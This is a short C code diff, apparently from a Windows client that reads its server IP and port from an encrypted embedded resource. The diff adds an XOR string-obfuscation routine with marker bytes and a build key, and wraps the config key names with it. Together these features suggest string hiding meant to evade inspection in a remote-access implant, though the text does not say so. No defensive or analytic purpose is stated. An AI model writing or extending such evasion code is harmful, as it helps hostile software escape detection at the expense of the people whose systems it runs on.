@@ -79,6 +79,29 @@ void str_trim(char* s) {
     memmove(s, p, l + 1);
 }
 
+unsigned char g_xor_key[5] = XOR_KEY_MARKER "\x00";
+
+char* xor_str(const char* str) {
+    if (memcmp(str, XOR_PROCESSED_MARKER, 4) != 0) return (char*)str;
+
+    static __thread char pools[32][1024];
+    static __thread int pool_idx = 0;
+
+    char* buf = pools[pool_idx];
+    pool_idx = (pool_idx + 1) % 32;
+
+    int len = (unsigned char)str[4];
+    const char* data = str + 5;
+    unsigned char key = g_xor_key[4];
+
+    for (int i = 0; i < len; i++) {
+        buf[i] = data[i] ^ key;
+    }
+    buf[len] = '\0';
+
+    return buf;
+}
+
 extern SessionKey g_session;
 
 void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
@@ -342,8 +365,8 @@ void load_config_from_resource() {
         pbPlain[cbResult] = 0;
         cJSON* root = cJSON_Parse((char*)pbPlain);
         if (root) {
-            cJSON* ip = cJSON_GetObjectItem(root, "ip");
-            cJSON* port = cJSON_GetObjectItem(root, "port");
+            cJSON* ip = cJSON_GetObjectItem(root, xor_str(_S("ip")));
+            cJSON* port = cJSON_GetObjectItem(root, xor_str(_S("port")));
             if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1);
             if (port) g_port = port->valueint;
             cJSON_Delete(root);
